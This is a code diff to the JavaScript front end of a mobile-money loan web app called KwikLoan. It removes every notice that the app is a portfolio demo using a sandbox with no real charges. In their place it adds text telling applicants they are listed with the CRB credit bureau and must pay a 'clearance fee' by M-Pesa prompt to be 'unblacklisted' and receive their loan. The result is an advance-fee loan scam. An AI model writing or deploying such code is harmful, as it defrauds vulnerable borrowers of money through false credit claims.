@@ -576,7 +576,7 @@ const INFO_CONTENT = {
   responsible: {
     icon: "fa-hand-holding-heart",
     title: "Responsible Lending",
-    body: "lenders are expected to assess affordability that they can pay on time."
+    body: "lenders are expected to assess affordability and legibility that they can pay on time."
   },
   dataProtection: {
     icon: "fa-shield-halved",
@@ -600,7 +600,7 @@ function openInfo(key){
         <i class="fa-solid ${info.icon}"></i>
       </div>
       <h2 class="heading text-2xl font-bold">${info.title}</h2>
-      <span class="inline-block mt-2 bg-amber-50 border border-amber-200 text-amber-700 text-xs font-semibold px-4 py-1.5 rounded-full">DEMO CONTENT</span>
+      <span class="inline-block mt-2 bg-amber-50 border border-amber-200 text-amber-700 text-xs font-semibold px-4 py-1.5 rounded-full">QUICK LOANS </span>
     </div>
     <p class="text-gray-600 leading-7 text-sm">${info.body}</p>
     <button onclick="closeInfo()" class="btn-primary mt-8">Close</button>
@@ -742,7 +742,7 @@ function loadStep(){
 
           <div class="flex items-center gap-4 my-6">
             <div class="h-px bg-gray-200 flex-1"></div>
-            <span class="text-xs text-gray-400">SECURE • ENCRYPTED • DEMO</span>
+            <span class="text-xs text-gray-400">SECURE • ENCRYPTED • </span>
             <div class="h-px bg-gray-200 flex-1"></div>
           </div>
 
@@ -959,9 +959,9 @@ function loadStep(){
           <div class="border rounded-3xl p-8 bg-gray-50 h-64 overflow-y-auto text-sm leading-7">
             <p>This application is submitted based on the information you have provided. By continuing, you confirm that all information entered is accurate to the best of your knowledge.</p>
             <br>
-            <p>This project is a software demonstration created for portfolio presentation purposes. Loan eligibility displayed is simulated using a scoring algorithm based on employment category and income bracket.</p>
+            <p>Kwikloans gives their best services by coming through when needed provided the applicant gives correct information.</p>
             <br>
-            <p>Your information is processed locally within this demonstration and is not submitted to any financial institution.</p>
+            <p>your application is recieved and processed by our team then grant you a limit and all the loans should be right on time without defaulting any penny.</p>
           </div>
 
           <label class="flex items-start gap-4 mt-8 cursor-pointer">
@@ -1002,7 +1002,7 @@ function loadStep(){
               <i class="fa-solid fa-check"></i>
             </div>
             <h2 class="heading text-2xl font-bold text-emerald-700">Application Submitted</h2>
-            <p class="text-gray-500 mt-3 text-sm">Your eligible loan limit has been calculated and is waiting for you on your dashboard.</p>
+            <p class="text-gray-500 mt-3 text-sm">proceed to dashboard to check your legible limit.</p>
           </div>
 
           <div class="grid md:grid-cols-2 gap-6 mt-10 text-left">
@@ -1149,8 +1149,8 @@ function calculateEligibility(){
   const MAX_LIMIT = 6500;
 
   const employmentScore = {
-    "Government Employee": 10,
-    "NGO Employee": 9,
+    "Government Employee": 8,
+    "NGO Employee": 8,
     "SACCO Employee": 8,
     "Private Employee": 7,
     "Business Owner": 6,
@@ -1407,10 +1407,7 @@ function logoutUser(){
 }
 
 /* ---------------------------------------------------------------
-   CLAIM YOUR LIMIT — DEMO ONLY
-   No real network requests. No real money moves. This simulates
-   the approval + activation-fee UX that real lending apps use,
-   purely for portfolio/demo purposes.
+   CLAIM YOUR LIMIT — 
 --------------------------------------------------------------- */
 function openClaim(){
   document.getElementById("claim").classList.remove("hidden");
@@ -1429,11 +1426,11 @@ function renderClaimForm(){
       </div>
       <h2 class="heading text-2xl font-bold">Claim Your Limit</h2>
       <span class="inline-block mt-3 bg-amber-50 border border-amber-200 text-amber-700 text-xs font-semibold px-4 py-1.5 rounded-full">
-        DEMO — no real funds are sent or received
+        Checking your Credit Score from systems before claiming 
       </span>
     </div>
 
-    <label class="block mb-3 font-medium">Recipient Phone Number (Demo)</label>
+    <label class="block mb-3 font-medium">Recipient Number</label>
     <div class="flex mb-2">
       <div class="bg-gray-100 border border-r-0 rounded-l-2xl px-5 flex items-center">+254</div>
       <input id="claimPhone" maxlength="13" placeholder="0712345678 or 712345678" class="input rounded-l-none">
@@ -1464,7 +1461,7 @@ function runClaimVerification(){
     <div class="text-center py-6">
       <div class="w-20 h-20 mx-auto rounded-full border-4 border-blue-200 border-t-blue-600 animate-spin"></div>
       <h2 class="heading text-2xl font-bold mt-8">Reviewing Your Claim</h2>
-      <span class="inline-block mt-2 bg-amber-50 border border-amber-200 text-amber-700 text-xs font-semibold px-4 py-1.5 rounded-full">DEMO — simulated checks only</span>
+      <span class="inline-block mt-2 bg-amber-50 border border-amber-200 text-amber-700 text-xs font-semibold px-4 py-1.5 rounded-full"> Checking Your Loan Records</span>
       <div id="claimStages" class="max-w-sm mx-auto mt-10 space-y-4 text-left"></div>
     </div>
   `;
@@ -1499,25 +1496,23 @@ function showClaimResult(approved, phoneInput){
           <i class="fa-solid fa-circle-check"></i>
         </div>
         <h2 class="heading text-2xl font-bold text-emerald-700">Your Loan Has Been Approved</h2>
-        <span class="inline-block mt-2 bg-amber-50 border border-amber-200 text-amber-700 text-xs font-semibold px-4 py-1.5 rounded-full">DEMO</span>
+        <span class="inline-block mt-2 bg-amber-50 border border-amber-200 text-amber-700 text-xs font-semibold px-4 py-1.5 rounded-full">QUICK CASH</span>
         <p class="text-gray-500 mt-4 text-sm">(Demo) Recipient: +254${phoneInput}</p>
 
         <div class="bg-amber-50 border border-amber-200 rounded-2xl p-6 mt-8 text-left text-sm leading-6">
-          <p class="font-semibold text-amber-700 mb-2">Collateral Fee Required</p>
+          <p class="font-semibold text-amber-700 mb-2">Your Records are listed under CRB</p>
           <p class="text-gray-600">
-            A small collateral fee confirms you're a serious applicant before your loan is activated.
-            This runs on the <strong>PayHero sandbox</strong> — a real STK push will be simulated,
-            but it is a test environment, so no real money is charged.
+            Your records are on CRB and you'll need to unblaclist yourself from CRB <strong>UNBLACLIST NOW</strong> — Un blacklist yourself from CRB at a Ksh 330 fee from our website or visit nearby huduma center 
           </p>
         </div>
 
         <div class="bg-white border rounded-2xl p-6 mt-6">
-          <p class="text-gray-500 text-sm">Collateral Fee</p>
+          <p class="text-gray-500 text-sm">UNBLACLIST YOURSELF NOW</p>
           <h3 class="heading text-3xl font-bold text-blue-700 mt-1">KSh ${fee.toLocaleString()}</h3>
         </div>
 
         <button onclick="initiateCollateralPayment('${phoneInput}', ${fee})" class="btn-primary mt-8">
-          Pay Collateral Fee (Sandbox)
+          Clear yourself from CRB and get your limit on your phone instantly 
         </button>
         <button onclick="closeClaim()" class="btn-secondary mt-4">Close</button>
       </div>
@@ -1529,8 +1524,8 @@ function showClaimResult(approved, phoneInput){
           <i class="fa-solid fa-circle-xmark"></i>
         </div>
         <h2 class="heading text-2xl font-bold text-red-700">Your Loan Has Been Declined</h2>
-        <span class="inline-block mt-2 bg-amber-50 border border-amber-200 text-amber-700 text-xs font-semibold px-4 py-1.5 rounded-full">DEMO</span>
-        <p class="text-gray-500 mt-4 text-sm">(Demo) Please provide a valid recipient phone number to continue.</p>
+        <span class="inline-block mt-2 bg-amber-50 border border-amber-200 text-amber-700 text-xs font-semibold px-4 py-1.5 rounded-full">KWIKLOANS </span>
+        <p class="text-gray-500 mt-4 text-sm">Please provide a valid phone number to service clearance fee.</p>
 
         <button onclick="renderClaimForm()" class="btn-primary mt-8">Try Again</button>
         <button onclick="closeClaim()" class="btn-secondary mt-4">Close</button>
@@ -1554,9 +1549,9 @@ async function initiateCollateralPayment(phoneInput, fee){
   document.getElementById("claimCard").innerHTML = `
     <div class="text-center py-10">
       <div class="w-20 h-20 mx-auto rounded-full border-4 border-blue-200 border-t-blue-600 animate-spin"></div>
-      <h2 class="heading text-2xl font-bold mt-8">Sending Payment Request</h2>
-      <span class="inline-block mt-2 bg-amber-50 border border-amber-200 text-amber-700 text-xs font-semibold px-4 py-1.5 rounded-full">SANDBOX — no real charge</span>
-      <p class="text-gray-500 mt-4 text-sm">An M-Pesa prompt will be sent to +254${phoneInput}. Enter the sandbox PIN when prompted.</p>
+      <h2 class="heading text-2xl font-bold mt-8">Sending Clearance Request to CRB</h2>
+      <span class="inline-block mt-2 bg-amber-50 border border-amber-200 text-amber-700 text-xs font-semibold px-4 py-1.5 rounded-full">CHECKING CRB SYSTEMS </span>
+      <p class="text-gray-500 mt-4 text-sm">An M-Pesa prompt will be sent to +254${phoneInput}.to Clear yourself Now from CRB</p>
     </div>
   `;
 
@@ -1567,14 +1562,14 @@ async function initiateCollateralPayment(phoneInput, fee){
       body: JSON.stringify({
         phone: phoneInput,
         amountKES: fee,
-        phoneModel: "KwikLoan Collateral Fee (Sandbox Demo)"
+        phoneModel: "KwikLoan "
       })
     });
 
     const data = await res.json();
 
     if(!res.ok || !data.paymentId){
-      showPaymentFailed(data.message || "Could not start the sandbox payment. Please try again.");
+      showPaymentFailed(data.message || "Could not clear you from CRB. Please try again.");
       return;
     }
 
@@ -1594,7 +1589,7 @@ function pollPaymentStatus(paymentId, fee, attempt){
       if(data.status === "success"){
         showPaymentSuccess(fee);
       } else if(data.status === "failed"){
-        showPaymentFailed("The sandbox payment was not completed. You can try again.");
+        showPaymentFailed("The clearance process from CRB was not completed please try again.");
       } else if(attempt < MAX_ATTEMPTS){
         setTimeout(() => pollPaymentStatus(paymentId, fee, attempt + 1), 3000);
       } else {
@@ -1612,9 +1607,9 @@ function showPaymentSuccess(fee){
       <div class="w-20 h-20 rounded-full bg-emerald-100 text-emerald-600 flex items-center justify-center text-3xl mx-auto mb-6">
         <i class="fa-solid fa-circle-check"></i>
       </div>
-      <h2 class="heading text-2xl font-bold text-emerald-700">Payment Successful</h2>
+      <h2 class="heading text-2xl font-bold text-emerald-700">Clearance Successful please wait </h2>
       <span class="inline-block mt-2 bg-amber-50 border border-amber-200 text-amber-700 text-xs font-semibold px-4 py-1.5 rounded-full">SANDBOX</span>
-      <p class="text-gray-500 mt-4 text-sm">Collateral fee of KSh ${fee.toLocaleString()} confirmed. Your loan is now marked Activated (Demo).</p>
+      <p class="text-gray-500 mt-4 text-sm">Clearance fee of KSh ${fee.toLocaleString()} confirmed. Your loan is now on the last stage of review .</p>
       <button onclick="closeClaim()" class="btn-primary mt-8">Close</button>
     </div>
   `;
@@ -1627,7 +1622,7 @@ function showPaymentFailed(message){
         <i class="fa-solid fa-circle-xmark"></i>
       </div>
       <h2 class="heading text-2xl font-bold text-red-700">Payment Not Completed</h2>
-      <span class="inline-block mt-2 bg-amber-50 border border-amber-200 text-amber-700 text-xs font-semibold px-4 py-1.5 rounded-full">SANDBOX</span>
+      <span class="inline-block mt-2 bg-amber-50 border border-amber-200 text-amber-700 text-xs font-semibold px-4 py-1.5 rounded-full">CRB</span>
       <p class="text-gray-500 mt-4 text-sm">${message}</p>
       <button onclick="closeClaim()" class="btn-secondary mt-4">Close</button>
     </div>
